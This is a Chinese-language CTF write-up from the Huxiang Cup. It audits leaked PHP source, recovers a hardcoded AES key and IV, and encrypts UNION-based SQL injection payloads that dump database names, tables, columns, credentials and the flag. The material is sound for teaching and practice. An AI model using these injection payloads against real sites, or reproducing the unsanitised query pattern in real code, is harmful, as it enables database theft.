---
title: 湖湘杯的一个check code题
date: January 1st 2018
tags: [CTF, Writeup, SQL注入, 加密解密]
summary: 湖湘杯 CTF 赛题 Writeup，分析 AES 加密参数的解密过程，结合 PHP 源码审计发现并利用 SQL 注入漏洞获取 flag。
---

# 湖湘杯的一个check code题

题目地址：[http://47.107.232.77:49882/](http://47.107.232.77:49882/)  
打开后是一个公司的登录地址，试着用admin，admin登录一下。  

返回错误：  
Fatal error: Call to a member function fetch_assoc() on a non-object in /usr/share/nginx/html/login.php on line 15

登录框下面还有一个网址：[http://47.107.232.77:49882/news/list.php?id=b3FCRU5iOU9IemZYc1JQSkY0WG5JZz09](http://47.107.232.77:49882/news/list.php?id=b3FCRU5iOU9IemZYc1JQSkY0WG5JZz09)  
试着用sqlmap跑了一下，没有注入。

用御剑扫一下网址。  
扫出来了一个：[http://47.107.232.77:49882/news/](http://47.107.232.77:49882/news/)  
打开之后发现一个文件目录，第二个是一个zip文件，下载。  
里面是list网页的源码：  

```php
<?php
header('content-type:text/html;charset=utf-8');
require_once '../config.php';
//解密过程
function decode($data){
	$td = mcrypt_module_open(MCRYPT_RIJNDAEL_128,'',MCRYPT_MODE_CBC,'');
	mcrypt_generic_init($td,'ydhaqPQnexoaDuW3','2018201920202021');
	$data = mdecrypt_generic($td,base64_decode(base64_decode($data)));
	mcrypt_generic_deinit($td);
	mcrypt_module_close($td);
	if(substr(trim($data),-7)!=='hxb2018'){
		echo '<script>window.location.href="/index.php";</script>';
	}else{
		return substr(trim($data),0,strlen(trim($data))-7);
	}
}
$id=decode($_GET['id']);
$sql="select id,title,content,time from notice where id=$id";
$info=$link->query($sql);
$arr=$info->fetch_assoc();
?>
```

从源码可知，这里存在一个注入的点，但是在赋值id变量的时候，还进行了一个一个解码过程，所以我们在注入的时候要先将我们的payload进行编码。  

编码函数看起来很复杂，试着分析一下。

## 代码分析

**前面使用了PHP mcrypt加密扩展：**

1. 打开加密算法和模式  
 mcrypt_module_open(‘tripledes’, ‘’, ecb’’, ‘’);  
 第一个参数是使用的加密算法的名称，对应mcrypt_list_algorithms()输出的加密算法；第三个参数对应加密的模式，对应mcrypt_list_modes()输出的支持加密模式。  
 可知这个题目源码使用的是AES算法，并且加密算法为：MCRYPT_RIJNDAEL_128，加密模式为：MCRYPT_MODE_CBC。
2. 创建初始化向量 (这题源码没有用到)  
 mcrypt_create_iv (mcrypt_enc_get_iv_size($td), MCRYPT_RAND);  
 PS.在Window平台下，第二个参数固定使用MCRYPT_RAND
3. 初始化加密缓冲区  
mcrypt_generic_init($td, $key, $iv);  
$td为返回的加密描述符，$key为加密密钥，$iv为初始化向量  
 这题源码的解密密钥为：ydhaqPQnexoaDuW3 这里的iv它直接提供了：2018201920202021
4. 数据加密  (题目当中用的是解密)  
 $encrypted_data = mcrypt_generic($td, $data);  
 $td为加密描述符，$data为加密前的数据，数据加密函数返回加密后的字符串。  
 题目源码当中将data数据进行了两次base64编码，再进行AES解密。
5. 结束解密，执行清理工作  
 mcrypt_generic_deinit($td);

在进行加密后面还有一个判断语句：

```php
if(substr(trim($data),-7)!=='hxb2018'){
	echo '<script>window.location.href="/index.php";</script>';
}else{
	return substr(trim($data),0,strlen(trim($data))-7);
}
```

判断解密后的data数据当中最后是否有hxb2018字符，如果找到并将它删除返回处理后的data。

那么到这里，构造加密的思路就为：（（（（构造的语句+hxb2018）AES加密）base64加密）base64加密）

打开一个AES加解密的在线工具：[http://tool.chacuo.net/cryptaes](http://tool.chacuo.net/cryptaes)   (填充为zero)

构造一个语句：1 and 1=2 union select 1,2,3,4hxb2018

填入正确的内容，直接加密。（这里已经进行了一次base64加密）

0hMY7i4yFMb48GTM7O6GEssuXfsRxn4Y0k5vZ9cRUUF6X4uM6Hu1P

再进行一次base64加密

MGhNWTdpNHlGTWI0OEdUTTdPNkdFc3N1WGZzUnhuNFkwazV2WjljUlVVRjZYNHVNNkh1MVAvaTR4bDRoTE9lQw==

访问：[http://47.107.232.77:49882/news/list.php?id=MGhNWTdpNHlGTWI0OEdUTTdPNkdFc3N1WGZzUnhuNFkwazV2WjljUlVVRjZYNHVNNkh1MVAvaTR4bDRoTE9lQw==](http://47.107.232.77:49882/news/list.php?id=MGhNWTdpNHlGTWI0OEdUTTdPNkdFc3N1WGZzUnhuNFkwazV2WjljUlVVRjZYNHVNNkh1MVAvaTR4bDRoTE9lQw==)

出现标题为2，内容为3.则知道了显示位置。继续

### 爆数据库名

1 and 1=2 union select 1,database(),version(),4hxb2018  
得到数据库名为：mozhe_discuz_stormgroup

### 爆表名

1 and 1=2 union select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema=’mozhe_discuz_stormgroup’hxb2018  
可得出表名为：notice,notice2,stormgroup_member

### 找字段名

1 and 1=2 union select 1,group_concat(COLUMN_NAME),group_concat(COLUMN_TYPE),4 from information_schema.COLUMNS where TABLE_SCHEMA=’mozhe_discuz_stormgroup’ and TABLE_NAME=’stormgroup_member’hxb2018

- notice表：  
id,title,content,time  
int(4),varchar(200),varchar(2000),varchar(200)
- notice2表：  
id,title  
int(4),varchar(200)
- stormgroup_member表  
id,name,password,status  
int(11),varchar(20),varchar(255),int(11)

### 读数据

从stormgroup_member表中可以读出账号和密码，但是登录之后发现还是报错。

于是我们再看一下其他的两个表，我们直接试一下notice2表，notice表一样的操作。

1 and 1=2 union select 1,group_concat(id),group_concat(title),4 from mozhe_discuz_stormgroup.notice2hxb2018

直接可以得出flag：hxb2018{1b4092cd183df0d2d1a96bcd3099d3d5}

### 参考

[https://blog.csdn.net/qq_42357070/article/details/82878357](https://blog.csdn.net/qq_42357070/article/details/82878357)  
[https://www.cnblogs.com/huyihao/p/6028753.html](https://www.cnblogs.com/huyihao/p/6028753.html)